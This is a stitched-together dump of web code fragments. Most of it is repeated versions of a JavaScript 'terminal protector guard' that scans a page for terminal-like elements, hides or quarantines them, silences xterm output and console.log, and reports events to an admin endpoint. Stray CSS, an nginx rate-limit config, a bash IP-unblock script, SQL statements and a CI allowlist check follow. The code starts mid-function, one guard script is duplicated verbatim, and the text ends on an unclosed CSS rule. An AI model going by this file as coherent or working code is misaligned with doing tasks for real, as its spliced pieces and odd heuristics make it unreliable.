    for (const re of SUSPICIOUS_KEYWORDS) if (re.test(text)) return true;
    // behavioral heuristic: inline script that defines protector functions
    if (node.tagName === 'SCRIPT' && node.textContent && /protectOutput|maskOutput|interceptOutput|overrideWrite/.test(node.textContent)) return true;
    return false;
  } catch(e){ return false; }
}

/* Add event row to table */
function addEventRow(ev){
  const tbody = document.querySelector('#eventsTable tbody');
  const tr = document.createElement('tr');
  const time = new Date(ev.detectedAt || ev.time || Date.now()).toLocaleString();
  tr.innerHTML = `<td>${time}</td><td>${(ev.tag || ev.selector || '[unknown]')}</td><td>${ev.reason || ev.reason || 'suspicious'}</td>
    <td><button class="btn" data-action="restore">Restore</button> <button class="btn btn-danger" data-action="quarantine">Quarantine</button></td>`;
  tbody.prepend(tr);
}

/* Scan DOM and act according to mode */
function scanAndAct(){
  const nodes = Array.from(document.querySelectorAll(SUSPICIOUS_SELECTORS.join(',')));
  // also include any script/link nodes for keyword matches
  nodes.push(...Array.from(document.querySelectorAll('script,link,iframe,div')).filter(n => isSuspicious(n)));
  const seen = new Set();
  for (const n of nodes) {
    if (!n || seen.has(n)) continue;
    seen.add(n);
    if (n.hasAttribute && n.hasAttribute('data-allowed')) {
      log('Allowed node skipped: ' + (n.id || n.className || n.tagName));
      continue;
    }
    const reason = 'selector/keyword match';
    if (mode === 'audit') {
      log('Audit detected suspicious node: ' + (n.id || n.className || n.tagName));
      reportToServer({ event: 'audit_detect', evidence: evidenceFor(n) });
      addEventRow({ detectedAt: Date.now(), tag: n.tagName, reason: 'audit_detect' });
    } else {
      // enforce: quarantine if script or iframe, otherwise neutralize
      if (n.tagName === 'SCRIPT' || n.tagName === 'IFRAME') quarantineNode(n, reason);
      else neutralizeNode(n, reason);
    }
  }
}

/* Live monitoring: observe added nodes */
const observer = new MutationObserver(muts => {
  for (const m of muts) {
    for (const n of m.addedNodes) {
      if (n.nodeType !== 1) continue;
      if (isSuspicious(n) && !n.hasAttribute('data-allowed')) {
        if (mode === 'audit') {
          reportToServer({ event: 'audit_detect', evidence: evidenceFor(n) });
          log('Audit detect (live): ' + (n.tagName || 'node'));
          addEventRow({ detectedAt: Date.now(), tag: n.tagName, reason: 'live_audit' });
        } else {
          if (n.tagName === 'SCRIPT' || n.tagName === 'IFRAME') quarantineNode(n, 'live_injection');
          else neutralizeNode(n, 'live_injection');
        }
      }
    }
  }
});
observer.observe(document.documentElement, { childList: true, subtree: true });

/* UI bindings */
document.getElementById('refresh').addEventListener('click', () => { scanAndAct(); log('Manual scan triggered'); });
document.getElementById('toggleMode').addEventListener('click', () => {
  mode = (mode === 'audit') ? 'enforce' : 'audit';
  document.getElementById('toggleMode').textContent = 'Mode: ' + (mode === 'audit' ? 'Audit' : 'Enforce');
  log('Mode switched to ' + mode);
});
document.getElementById('markAllowed').addEventListener('click', () => {
  const sel = document.getElementById('allowSelector').value.trim();
  if (!sel) return alert('Enter a selector');
  const nodes = document.querySelectorAll(sel);
  nodes.forEach(n => n.setAttribute('data-allowed', 'true'));
  alert('Marked ' + nodes.length + ' node(s) allowed');
});
document.getElementById('allowAll').addEventListener('click', () => {
  document.querySelectorAll('.terminal, .xterm, x-terminal').forEach(n => n.setAttribute('data-allowed', 'true'));
  alert('All embedded terminals marked allowed');
});

/* Initial scan on load */
scanAndAct();
log('Terminal Output Protector Guard initialized (mode=' + mode + ')');/* CONFIG: set server endpoint and auth headers */
const API_BASE = '/admin/api'; // must be implemented server-side
const AUTH_HEADERS = { 'X-Admin-Token': 'REPLACE_WITH_SECURE_TOKEN' };

/* Detection & heuristics */
const DEFAULT_SELECTORS = ['.terminal', '.xterm', 'x-terminal', '[data-terminal]', 'iframe.terminal-frame'];
const KEYWORD_RE = /(protector|maskOutput|interceptOutput|overrideWrite|scent|tweaker)/i;

/* Mode: 'audit' (log/report only) or 'enforce' (neutralize + quarantine) */
let mode = 'audit';

/* Logging helper */
function log(msg){
  const el = document.getElementById('log');
  el.textContent = new Date().toISOString() + ' ' + msg + '\\n' + el.textContent;
  console.log(msg);
}

/* Evidence builder */
function evidenceFor(node){
  try {
    return {
      tag: node.tagName,
      id: node.id || null,
      classes: node.className || null,
      snippet: node.outerHTML ? node.outerHTML.slice(0,1200) : null,
      detectedAt: Date.now()
    };
  } catch(e){ return { tag: node.tagName, detectedAt: Date.now(), error: String(e) }; }
}

/* Report to server (best-effort) */
function report(payload){
  try { navigator.sendBeacon(API_BASE + '/tamper-log', JSON.stringify(payload)); }
  catch(e){ fetch(API_BASE + '/tamper-log', {method:'POST', headers: Object.assign({'Content-Type':'application/json'}, AUTH_HEADERS), body: JSON.stringify(payload)}).catch(()=>{}); }
}

/* Create hidden sandbox iframe for quarantined copies */
function getOrCreateSandbox(){
  let iframe = document.getElementById('__terminal_quarantine_sandbox');
  if (iframe) return iframe;
  iframe = document.createElement('iframe');
  iframe.id = '__terminal_quarantine_sandbox';
  iframe.sandbox = 'allow-scripts'; // minimal privileges; do not allow same-origin
  iframe.style.display = 'none';
  iframe.srcdoc = '<!doctype html><html><body></body></html>';
  document.body.appendChild(iframe);
  return iframe;
}

/* Remove event listeners by cloning without listeners */
function cloneWithoutListeners(node){
  try {
    const clone = node.cloneNode(true);
    // remove inline event handler attributes
    for (const attr of Array.from(clone.attributes || [])) {
      if (/^on/i.test(attr.name)) clone.removeAttribute(attr.name);
    }
    return clone;
  } catch(e){ return null; }
}

/* Monkey-patch common terminal APIs to no-op (xterm.js example) */
function patchTerminalAPIs(){
  try {
    // xterm.js: Terminal.prototype.write
    const Term = window.Terminal || (window.XTerm && window.XTerm.Terminal) || null;
    if (Term && Term.prototype && !Term.prototype.__write_patched) {
      const origWrite = Term.prototype.write;
      Term.prototype.write = function(data){
        // no-op: prevent output
        return this;
      };
      Term.prototype.__write_patched = true;
      log('Patched xterm Terminal.prototype.write to no-op');
      report({ event:'api_patch', api:'xterm.write', ts:Date.now() });
    }
    // patch other common names (best-effort)
    if (window.Terminal && window.Terminal.write && !window.Terminal.__write_patched_global) {
      const orig = window.Terminal.write;
      window.Terminal.write = function(){ return; };
      window.Terminal.__write_patched_global = true;
      log('Patched global Terminal.write');
    }
  } catch(e){ log('API patch error: ' + e); }
}

/* Neutralize node in-place (hide, disable pointer events, strip listeners) */
function neutralizeNode(node, reason){
  try {
    node.style.display = 'none';
    node.style.pointerEvents = 'none';
    node.setAttribute('data-neutralized', 'true');
    node.setAttribute('data-neutralize-reason', reason);
    // attempt to remove inline handlers
    for (const attr of Array.from(node.attributes || [])) if (/^on/i.test(attr.name)) node.removeAttribute(attr.name);
    // replace textContent to prevent output reads
    try { node.textContent = ''; } catch(e){}
    report({ event:'neutralize', reason, evidence: evidenceFor(node) });
    log('Neutralized node: ' + (node.id || node.className || node.tagName) + ' reason=' + reason);
  } catch(e){ log('Neutralize failed: ' + e); }
}

/* Quarantine: copy into sandbox and remove original */
function quarantineNode(node, reason){
  try {
    const ev = evidenceFor(node);
    ev.reason = reason;
    report({ event:'quarantine', evidence: ev });
    const sandbox = getOrCreateSandbox();
    const holder = sandbox.contentDocument.createElement('div');
    holder.setAttribute('data-quarantine-ts', Date.now());
    // clone without listeners to avoid executing scripts
    const clone = cloneWithoutListeners(node) || document.createElement('div');
    clone.setAttribute('data-quarantined', 'true');
    holder.appendChild(clone);
    sandbox.contentDocument.body.appendChild(holder);
    node.remove();
    log('Quarantined node: ' + (node.id || node.className || node.tagName) + ' reason=' + reason);
    // store last quarantine for restore
    window.__lastQuarantine = { html: holder.innerHTML, ts: Date.now() };
  } catch (err) {
    try { node.remove(); } catch(e){}
    log('Quarantine failed: ' + err);
  }
}

/* Heuristic: is node suspicious? */
function isSuspicious(node){
  try {
    if (!node || node.nodeType !== 1) return false;
    if (node.hasAttribute && node.hasAttribute('data-allowed')) return false;
    // selector match
    for (const sel of DEFAULT_SELECTORS) {
      if (node.matches && node.matches(sel)) return true;
    }
    // attribute/class/src text scan
    const text = (node.className || '') + ' ' + (node.id || '') + ' ' + (node.getAttribute && (node.getAttribute('data-protector') || '')) + ' ' + (node.src || node.href || '');
    if (KEYWORD_RE.test(text)) return true;
    // inline script content heuristic
    if (node.tagName === 'SCRIPT' && node.textContent && /protectOutput|maskOutput|interceptOutput|overrideWrite/.test(node.textContent)) return true;
    return false;
  } catch(e){ return false; }
}

/* Scan DOM and act according to mode */
function scanAndAct(){
  patchTerminalAPIs(); // always attempt to patch APIs first
  const candidates = new Set();
  // gather by selectors
  for (const sel of DEFAULT_SELECTORS) {
    document.querySelectorAll(sel).forEach(n => candidates.add(n));
  }
  // also scan scripts/iframes/divs for keyword matches
  document.querySelectorAll('script,iframe,div').forEach(n => { if (isSuspicious(n)) candidates.add(n); });

  for (const n of candidates) {
    if (!n || n.hasAttribute && n.hasAttribute('data-allowed')) continue;
    const reason = 'heuristic_match';
    if (mode === 'audit') {
      report({ event:'audit_detect', evidence: evidenceFor(n) });
      log('Audit detected suspicious node: ' + (n.id || n.className || n.tagName));
    } else {
      if (n.tagName === 'SCRIPT' || n.tagName === 'IFRAME') quarantineNode(n, reason);
      else neutralizeNode(n, reason);
    }
  }
}

/* Live monitoring for dynamic injections */
const observer = new MutationObserver(muts => {
  for (const m of muts) {
    for (const n of m.addedNodes) {
      if (n.nodeType !== 1) continue;
      if (isSuspicious(n) && !n.hasAttribute('data-allowed')) {
        if (mode === 'audit') {
          report({ event:'audit_detect', evidence: evidenceFor(n) });
          log('Live audit detect: ' + (n.tagName || 'node'));
        } else {
          if (n.tagName === 'SCRIPT' || n.tagName === 'IFRAME') quarantineNode(n, 'live_injection');
          else neutralizeNode(n, 'live_injection');
        }
      }
    }
  }
});
observer.observe(document.documentElement, { childList: true, subtree: true });

/* UI bindings */
document.getElementById('scanBtn').addEventListener('click', () => { scanAndAct(); log('Manual scan triggered'); });
document.getElementById('modeToggle').addEventListener('click', () => {
  mode = (mode === 'audit') ? 'enforce' : 'audit';
  document.getElementById('modeToggle').textContent = 'Mode: ' + (mode === 'audit' ? 'Audit' : 'Enforce');
  log('Mode switched to ' + mode);
});
document.getElementById('allowAll').addEventListener('click', () => {
  document.querySelectorAll('.terminal, .xterm, x-terminal').forEach(n => n.setAttribute('data-allowed','true'));
  alert('All embedded terminals marked allowed');
});
document.getElementById('restoreBtn').addEventListener('click', () => {
  if (!window.__lastQuarantine) return alert('No quarantine to restore');
  const sandbox = getOrCreateSandbox();
  const html = window.__lastQuarantine.html;
  // restore into a safe container (admin must review)
  const container = document.createElement('div');
  container.innerHTML = html;
  container.setAttribute('data-restored', Date.now());
  document.body.appendChild(container);
  log('Restored last quarantine into page (review required)');
  report({ event:'restore', ts:Date.now(), note:'restored last quarantine copy into page for review' });
});

/* Allow selector input: mark matched nodes allowed */
document.getElementById('allowSelector').addEventListener('change', (e) => {
  const sel = e.target.value.trim();
  if (!sel) return;
  const nodes = document.querySelectorAll(sel);
  nodes.forEach(n => n.setAttribute('data-allowed','true'));
  alert('Marked ' + nodes.length + ' node(s) allowed');
});

/* Initial scan */
scanAndAct();
log('Terminal Quarantine Guard initialized (mode=' + mode + ')');/* CONFIG: set server endpoint and auth headers */
const API_BASE = '/admin/api'; // server must implement /tamper-log etc.
const AUTH_HEADERS = { 'X-Admin-Token': 'REPLACE_WITH_SECURE_TOKEN' };

/* Heuristics and selectors */
const SELECTORS = ['.shadow-protector', '.terminal', '.xterm', 'x-terminal', '[data-protector]'];
const KEYWORD_RE = /(protectOutput|maskOutput|interceptOutput|overrideWrite|shadowSelf|scent|tweaker)/i;

/* Mode: 'audit' or 'enforce' */
let mode = 'audit';

/* Logging */
function log(msg){
  const el = document.getElementById('log');
  el.textContent = new Date().toISOString() + ' ' + msg + '\\n' + el.textContent;
  console.log(msg);
}

/* Evidence builder */
function evidenceFor(node){
  try {
    return { tag: node.tagName, id: node.id||null, classes: node.className||null, snippet: node.outerHTML?node.outerHTML.slice(0,1200):null, ts: Date.now() };
  } catch(e){ return { tag: node.tagName, ts: Date.now(), error: String(e) }; }
}

/* Report to server (best-effort) */
function report(payload){
  try { navigator.sendBeacon(API_BASE + '/tamper-log', JSON.stringify(payload)); }
  catch(e){ fetch(API_BASE + '/tamper-log', {method:'POST', headers: Object.assign({'Content-Type':'application/json'}, AUTH_HEADERS), body: JSON.stringify(payload)}).catch(()=>{}); }
}

/* Sandbox creation for quarantined copies */
function getOrCreateSandbox(){
  let iframe = document.getElementById('__shadow_quarantine');
  if (iframe) return iframe;
  iframe = document.createElement('iframe');
  iframe.id = '__shadow_quarantine';
  iframe.sandbox = 'allow-scripts'; // minimal privileges
  iframe.style.display = 'none';
  iframe.srcdoc = '<!doctype html><html><body></body></html>';
  document.body.appendChild(iframe);
  return iframe;
}

/* Clone without inline event handlers */
function cloneSanitized(node){
  try {
    const clone = node.cloneNode(true);
    for (const attr of Array.from(clone.attributes || [])) if (/^on/i.test(attr.name)) clone.removeAttribute(attr.name);
    // remove script tags inside clone
    clone.querySelectorAll && clone.querySelectorAll('script').forEach(s => s.remove());
    return clone;
  } catch(e){ return null; }
}

/* Patch common output APIs (best-effort) */
function patchOutputAPIs(){
  try {
    const Term = window.Terminal || (window.XTerm && window.XTerm.Terminal) || null;
    if (Term && Term.prototype && !Term.prototype.__patched_noop) {
      Term.prototype.write = function(){ return this; };
      Term.prototype.__patched_noop = true;
      log('Patched Terminal.prototype.write to no-op');
      report({ event:'api_patch', api:'Terminal.write', ts:Date.now() });
    }
    if (window.console && !window.console.__patched_noop) {
      const origLog = console.log;
      console.log = function(){ /* no-op to prevent exfil via console */ };
      console.__patched_noop = true;
      log('Patched console.log to no-op (temporary)');
      report({ event:'api_patch', api:'console.log', ts:Date.now() });
      // restore is possible by reassigning origLog if needed
    }
  } catch(e){ log('API patch error: ' + e); }
}

/* Neutralize in-place */
function neutralize(node, reason){
  try {
    node.style.display = 'none';
    node.style.pointerEvents = 'none';
    node.setAttribute('data-neutralized','true');
    node.setAttribute('data-neutralize-reason', reason);
    for (const attr of Array.from(node.attributes || [])) if (/^on/i.test(attr.name)) node.removeAttribute(attr.name);
    try { node.textContent = ''; } catch(e){}
    report({ event:'neutralize', reason, evidence: evidenceFor(node) });
    log('Neutralized: ' + (node.id || node.className || node.tagName) + ' reason=' + reason);
  } catch(e){ log('Neutralize failed: ' + e); }
}

/* Quarantine (copy sanitized clone into sandbox and remove original) */
function quarantine(node, reason){
  try {
    const ev = evidenceFor(node); ev.reason = reason;
    report({ event:'quarantine', evidence: ev });
    const sandbox = getOrCreateSandbox();
    const holder = sandbox.contentDocument.createElement('div');
    holder.setAttribute('data-quarantine-ts', Date.now());
    const clone = cloneSanitized(node) || document.createElement('div');
    clone.setAttribute('data-quarantined','true');
    holder.appendChild(clone);
    sandbox.contentDocument.body.appendChild(holder);
    node.remove();
    window.__lastQuarantine = { html: holder.innerHTML, ts: Date.now() };
    log('Quarantined: ' + (node.id || node.className || node.tagName) + ' reason=' + reason);
  } catch(e){ try { node.remove(); } catch(_){}; log('Quarantine failed: ' + e); }
}

/* Heuristic detection */
function isSuspicious(node){
  try {
    if (!node || node.nodeType !== 1) return false;
    if (node.hasAttribute && node.hasAttribute('data-allowed')) return false;
    for (const sel of SELECTORS) if (node.matches && node.matches(sel)) return true;
    const text = (node.className||'') + ' ' + (node.id||'') + ' ' + (node.getAttribute && (node.getAttribute('data-protector')||'')) + ' ' + (node.src||node.href||'');
    if (KEYWORD_RE.test(text)) return true;
    if (node.tagName === 'SCRIPT' && node.textContent && /protectOutput|maskOutput|interceptOutput|overrideWrite/.test(node.textContent)) return true;
    return false;
  } catch(e){ return false; }
}

/* Scan and act */
function scanAndAct(){
  patchOutputAPIs();
  const candidates = new Set();
  for (const sel of SELECTORS) document.querySelectorAll(sel).forEach(n => candidates.add(n));
  document.querySelectorAll('script,iframe,div').forEach(n => { if (isSuspicious(n)) candidates.add(n); });
  for (const n of candidates) {
    if (!n || (n.hasAttribute && n.hasAttribute('data-allowed'))) continue;
    const reason = 'heuristic_match';
    if (mode === 'audit') {
      report({ event:'audit_detect', evidence: evidenceFor(n) });
      log('Audit detected: ' + (n.id || n.className || n.tagName));
    } else {
      if (n.tagName === 'SCRIPT' || n.tagName === 'IFRAME') quarantine(n, reason);
      else neutralize(n, reason);
    }
  }
}

/* Live monitoring */
const observer = new MutationObserver(muts => {
  for (const m of muts) for (const n of m.addedNodes) {
    if (n.nodeType !== 1) continue;
    if (isSuspicious(n) && !n.hasAttribute('data-allowed')) {
      if (mode === 'audit') { report({ event:'audit_detect', evidence: evidenceFor(n) }); log('Live audit detect: ' + n.tagName); }
      else { if (n.tagName === 'SCRIPT' || n.tagName === 'IFRAME') quarantine(n,'live_injection'); else neutralize(n,'live_injection'); }
    }
  }
});
observer.observe(document.documentElement, { childList:true, subtree:true });

/* UI bindings */
document.getElementById('scanBtn').addEventListener('click', () => { scanAndAct(); log('Manual scan triggered'); });
document.getElementById('modeToggle').addEventListener('click', () => {
  mode = (mode === 'audit') ? 'enforce' : 'audit';
  document.getElementById('modeToggle').textContent = 'Mode: ' + (mode === 'audit' ? 'Audit' : 'Enforce');
  log('Mode switched to ' + mode);
});
document.getElementById('allowAll').addEventListener('click', () => {
  document.querySelectorAll('.terminal, .xterm, x-terminal, .shadow-protector').forEach(n => n.setAttribute('data-allowed','true'));
  alert('All embedded terminals marked allowed');
});
document.getElementById('restoreBtn').addEventListener('click', () => {
  if (!window.__lastQuarantine) return alert('No quarantine to restore');
  const container = document.createElement('div');
  container.innerHTML = window.__lastQuarantine.html;
  container.setAttribute('data-restored', Date.now());
  document.body.appendChild(container);
  log('Restored last quarantine into page (review required)');
  report({ event:'restore', ts:Date.now(), note:'restored last quarantine copy into page for review' });
});
document.getElementById('allowSelector').addEventListener('change', (e) => {
  const sel = e.target.value.trim();
  if (!sel) return;
  const nodes = document.querySelectorAll(sel);
  nodes.forEach(n => n.setAttribute('data-allowed','true'));
  alert('Marked ' + nodes.length + ' node(s) allowed');
});

/* Initial scan */
scanAndAct();
log('Shadow Protector Guard initialized (mode=' + mode + ')');/* CONFIG: set server endpoint and auth headers */
const API_BASE = '/admin/api'; // server must implement /tamper-log etc.
const AUTH_HEADERS = { 'X-Admin-Token': 'REPLACE_WITH_SECURE_TOKEN' };

/* Heuristics and selectors */
const SELECTORS = ['.shadow-protector', '.terminal', '.xterm', 'x-terminal', '[data-protector]'];
const KEYWORD_RE = /(protectOutput|maskOutput|interceptOutput|overrideWrite|shadowSelf|scent|tweaker)/i;

/* Mode: 'audit' or 'enforce' */
let mode = 'audit';

/* Logging */
function log(msg){
  const el = document.getElementById('log');
  el.textContent = new Date().toISOString() + ' ' + msg + '\\n' + el.textContent;
  console.log(msg);
}

/* Evidence builder */
function evidenceFor(node){
  try {
    return { tag: node.tagName, id: node.id||null, classes: node.className||null, snippet: node.outerHTML?node.outerHTML.slice(0,1200):null, ts: Date.now() };
  } catch(e){ return { tag: node.tagName, ts: Date.now(), error: String(e) }; }
}

/* Report to server (best-effort) */
function report(payload){
  try { navigator.sendBeacon(API_BASE + '/tamper-log', JSON.stringify(payload)); }
  catch(e){ fetch(API_BASE + '/tamper-log', {method:'POST', headers: Object.assign({'Content-Type':'application/json'}, AUTH_HEADERS), body: JSON.stringify(payload)}).catch(()=>{}); }
}

/* Sandbox creation for quarantined copies */
function getOrCreateSandbox(){
  let iframe = document.getElementById('__shadow_quarantine');
  if (iframe) return iframe;
  iframe = document.createElement('iframe');
  iframe.id = '__shadow_quarantine';
  iframe.sandbox = 'allow-scripts'; // minimal privileges
  iframe.style.display = 'none';
  iframe.srcdoc = '<!doctype html><html><body></body></html>';
  document.body.appendChild(iframe);
  return iframe;
}

/* Clone without inline event handlers */
function cloneSanitized(node){
  try {
    const clone = node.cloneNode(true);
    for (const attr of Array.from(clone.attributes || [])) if (/^on/i.test(attr.name)) clone.removeAttribute(attr.name);
    // remove script tags inside clone
    clone.querySelectorAll && clone.querySelectorAll('script').forEach(s => s.remove());
    return clone;
  } catch(e){ return null; }
}

/* Patch common output APIs (best-effort) */
function patchOutputAPIs(){
  try {
    const Term = window.Terminal || (window.XTerm && window.XTerm.Terminal) || null;
    if (Term && Term.prototype && !Term.prototype.__patched_noop) {
      Term.prototype.write = function(){ return this; };
      Term.prototype.__patched_noop = true;
      log('Patched Terminal.prototype.write to no-op');
      report({ event:'api_patch', api:'Terminal.write', ts:Date.now() });
    }
    if (window.console && !window.console.__patched_noop) {
      const origLog = console.log;
      console.log = function(){ /* no-op to prevent exfil via console */ };
      console.__patched_noop = true;
      log('Patched console.log to no-op (temporary)');
      report({ event:'api_patch', api:'console.log', ts:Date.now() });
      // restore is possible by reassigning origLog if needed
    }
  } catch(e){ log('API patch error: ' + e); }
}

/* Neutralize in-place */
function neutralize(node, reason){
  try {
    node.style.display = 'none';
    node.style.pointerEvents = 'none';
    node.setAttribute('data-neutralized','true');
    node.setAttribute('data-neutralize-reason', reason);
    for (const attr of Array.from(node.attributes || [])) if (/^on/i.test(attr.name)) node.removeAttribute(attr.name);
    try { node.textContent = ''; } catch(e){}
    report({ event:'neutralize', reason, evidence: evidenceFor(node) });
    log('Neutralized: ' + (node.id || node.className || node.tagName) + ' reason=' + reason);
  } catch(e){ log('Neutralize failed: ' + e); }
}

/* Quarantine (copy sanitized clone into sandbox and remove original) */
function quarantine(node, reason){
  try {
    const ev = evidenceFor(node); ev.reason = reason;
    report({ event:'quarantine', evidence: ev });
    const sandbox = getOrCreateSandbox();
    const holder = sandbox.contentDocument.createElement('div');
    holder.setAttribute('data-quarantine-ts', Date.now());
    const clone = cloneSanitized(node) || document.createElement('div');
    clone.setAttribute('data-quarantined','true');
    holder.appendChild(clone);
    sandbox.contentDocument.body.appendChild(holder);
    node.remove();
    window.__lastQuarantine = { html: holder.innerHTML, ts: Date.now() };
    log('Quarantined: ' + (node.id || node.className || node.tagName) + ' reason=' + reason);
  } catch(e){ try { node.remove(); } catch(_){}; log('Quarantine failed: ' + e); }
}

/* Heuristic detection */
function isSuspicious(node){
  try {
    if (!node || node.nodeType !== 1) return false;
    if (node.hasAttribute && node.hasAttribute('data-allowed')) return false;
    for (const sel of SELECTORS) if (node.matches && node.matches(sel)) return true;
    const text = (node.className||'') + ' ' + (node.id||'') + ' ' + (node.getAttribute && (node.getAttribute('data-protector')||'')) + ' ' + (node.src||node.href||'');
    if (KEYWORD_RE.test(text)) return true;
    if (node.tagName === 'SCRIPT' && node.textContent && /protectOutput|maskOutput|interceptOutput|overrideWrite/.test(node.textContent)) return true;
    return false;
  } catch(e){ return false; }
}

/* Scan and act */
function scanAndAct(){
  patchOutputAPIs();
  const candidates = new Set();
  for (const sel of SELECTORS) document.querySelectorAll(sel).forEach(n => candidates.add(n));
  document.querySelectorAll('script,iframe,div').forEach(n => { if (isSuspicious(n)) candidates.add(n); });
  for (const n of candidates) {
    if (!n || (n.hasAttribute && n.hasAttribute('data-allowed'))) continue;
    const reason = 'heuristic_match';
    if (mode === 'audit') {
      report({ event:'audit_detect', evidence: evidenceFor(n) });
      log('Audit detected: ' + (n.id || n.className || n.tagName));
    } else {
      if (n.tagName === 'SCRIPT' || n.tagName === 'IFRAME') quarantine(n, reason);
      else neutralize(n, reason);
    }
  }
}

/* Live monitoring */
const observer = new MutationObserver(muts => {
  for (const m of muts) for (const n of m.addedNodes) {
    if (n.nodeType !== 1) continue;
    if (isSuspicious(n) && !n.hasAttribute('data-allowed')) {
      if (mode === 'audit') { report({ event:'audit_detect', evidence: evidenceFor(n) }); log('Live audit detect: ' + n.tagName); }
      else { if (n.tagName === 'SCRIPT' || n.tagName === 'IFRAME') quarantine(n,'live_injection'); else neutralize(n,'live_injection'); }
    }
  }
});
observer.observe(document.documentElement, { childList:true, subtree:true });

/* UI bindings */
document.getElementById('scanBtn').addEventListener('click', () => { scanAndAct(); log('Manual scan triggered'); });
document.getElementById('modeToggle').addEventListener('click', () => {
  mode = (mode === 'audit') ? 'enforce' : 'audit';
  document.getElementById('modeToggle').textContent = 'Mode: ' + (mode === 'audit' ? 'Audit' : 'Enforce');
  log('Mode switched to ' + mode);
});
document.getElementById('allowAll').addEventListener('click', () => {
  document.querySelectorAll('.terminal, .xterm, x-terminal, .shadow-protector').forEach(n => n.setAttribute('data-allowed','true'));
  alert('All embedded terminals marked allowed');
});
document.getElementById('restoreBtn').addEventListener('click', () => {
  if (!window.__lastQuarantine) return alert('No quarantine to restore');
  const container = document.createElement('div');
  container.innerHTML = window.__lastQuarantine.html;
  container.setAttribute('data-restored', Date.now());
  document.body.appendChild(container);
  log('Restored last quarantine into page (review required)');
  report({ event:'restore', ts:Date.now(), note:'restored last quarantine copy into page for review' });
});
document.getElementById('allowSelector').addEventListener('change', (e) => {
  const sel = e.target.value.trim();
  if (!sel) return;
  const nodes = document.querySelectorAll(sel);
  nodes.forEach(n => n.setAttribute('data-allowed','true'));
  alert('Marked ' + nodes.length + ' node(s) allowed');
});

/* Initial scan */
scanAndAct();
log('Shadow Protector Guard initialized (mode=' + mode + ')');
body {
  background: #20262E;
  padding: 20px;
  font-family: Helvetica;
}

#app {
  background: #fff;
  border-radius: 4px;
  padding: 20px;
  transition: all 0.2s;
  text-align: center;
}
:root {
  --brand-bg: #0b5cff;
  --brand-text: #fff;
}
body { background: var(--brand-bg) !important; color: var(--brand-text) !important; }
:root { --bg: #0b5cff; --fg: #ffffff; --accent: #ffd166; }
    html,body { height:100%; margin:0; font-family:system-ui,Segoe UI,Roboto,Arial; background:var(--bg); color:var(--fg); }
    header { padding:1rem; background:rgba(0,0,0,0.08); }
    main { padding:1rem; }
    .notice { background:var(--accent); color:#000; padding:.5rem; border-radius:6px; display:inline-block; }
    /* critical rules reasserted with !important to resist casual overrides */
    body { background:var(--bg) !important; color:var(--fg) !important; }:root { --bg:#0b5cff; --fg:#fff; --warn:#ffcc00; }
    html,body{height:100%;margin:0;font-family:system-ui,Segoe UI,Roboto,Arial;background:var(--bg);color:var(--fg)}
    main{padding:1rem}
    #ban-overlay{
      position:fixed;inset:0;display:none;align-items:center;justify-content:center;
      background:rgba(0,0,0,0.85);z-index:99999;color:#fff;padding:2rem;text-align:center;
    }
    #ban-overlay .box{max-width:720px}
    button{padding:.5rem 1rem;border-radius:6px;border:0;background:#fff;color:#000;cursor:pointer}
    .admin { margin-top:1rem; }
    .log { margin-top:1rem; font-size:0.9rem; color:#fff; opacity:0.9 }
    limit_req_zone $binary_remote_addr zone=rl:10m rate=10r/s;

server {
  listen 80;
  server_name example.com;

  limit_req zone=rl burst=20 nodelay;

  if ($http_x_blocked_by_app = "1") {
    return 403;
  }

  location / {
    proxy_pass http://app_upstream;
    proxy_set_header X-Real-IP $remote_addr;
    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
  }
}
#!/usr/bin/env bash
IP="$1"
NGINX_BLOCK_FILE="/etc/nginx/conf.d/blocked_ips.conf"
LOG="/var/log/edge-blocks.log"

iptables -D INPUT -s "$IP" -j DROP 2>/dev/null && echo "$(date -u) iptables DROP removed for $IP" >> "$LOG"
sed -i "\|deny $IP;|d" "$NGINX_BLOCK_FILE" && echo "$(date -u) nginx deny removed for $IP" >> "$LOG"
nginx -t && systemctl reload nginx
body{font-family:system-ui,Arial;margin:0;padding:1rem;background:#0b5cff;color:#fff}
    .status{background:#fff;color:#000;padding:.5rem;border-radius:6px;display:inline-block}
    pre{background:#002b5c;padding:1rem;border-radius:6px;overflow:auto}body{font-family:system-ui;margin:1rem;background:#0b5cff;color:#fff}
    UPDATE profiles SET status='disabled', disabled_at=now(), disabled_by=$1, reason=$2 WHERE id=$3;
INSERT INTO profile_audit(profile_id, action, actor, reason, ts) VALUES($3,'disabled',$1,$2,now());
# ci-verify-modules.sh
set -e
ALLOWLIST="ci/allowlist.txt"   # contains filenames allowed in dist/modules
for f in dist/modules/*.js; do
  bn=$(basename "$f")
  if ! grep -Fxq "$bn" "$ALLOWLIST"; then
    echo "Unknown module: $bn"
    exit 1
  fi
  # compute SRI
  openssl dgst -sha256 -binary "$f" | openssl base64 -A | awk '{print "sha256-"$0}' > "dist/modules/$bn.sri"
done
/* default: hide any element that does not carry data-allowed="true" */
:root { --guard-bg: #0b5cff; --guard-fg: #fff; }

body { background: var(--guard-bg); color: var(--guard-fg); }

/* All elements are hidden unless explicitly allowed (use sparingly; apply to a scoped container) */
#app *:not([data-allowed="true"]) {
  all: initial;            /* reset inherited styles */
  display: none !important;
  pointer-events: none !important;
  user-select: none !important;
  visibility: hidden !important;
}
/* make unknown elements non-interactive but still visible for inspection */
#app *:not([data-allowed="true"]) {
  pointer-events: none !important;
  touch-action: none !important;
  caret-color: transparent !important;
  -webkit-user-select: none !important;
}
/* CSS: apply a near‑instant animation to newly inserted nodes that lack data-allowed */
@keyframes nodeInserted { from { opacity: 1 } to { opacity: 1 } }

#app *:not([data-allowed="true"]) {
  animation-duration: 0.001s;
  animation-name: nodeInserted;
}
/* CSS: deny-by-default inside #app */
#app *:not([data-allowed="true"]) {
  all: initial;                       /* reset styles */
  display: none !important;           /* hide unknown nodes */
  pointer-events: none !important;    /* disable interaction */
  user-select: none !important;
  visibility: hidden !important;
}
/* Non-interactive unknown elements (scoped) */
#app *:not([data-allowed="true"]) {
  pointer-events: none !important;
  touch-action: none !important;
  caret-color: transparent !important;
  -webkit-user-select: none !important;
  opacity: 0.9; /* still visible for ops inspection if needed */
}
/* Audit mode: highlight unknown nodes */
#app *:not([data-allowed="true"]) {
  outline: 3px dashed rgba(255,0,0,0.85) !important;
  background: rgba(255,0,0,0.06) !important;
  color: inherit !important;
}
:root { --brand:#0b5cff; --text:#ffffff; }
  html,body{height:100%;margin:0;font-family:system-ui,Arial,sans-serif;background:var(--brand)!important;color:var(--text)!important}
  header,main,footer{background:transparent!important;color:inherit!important}

:root {
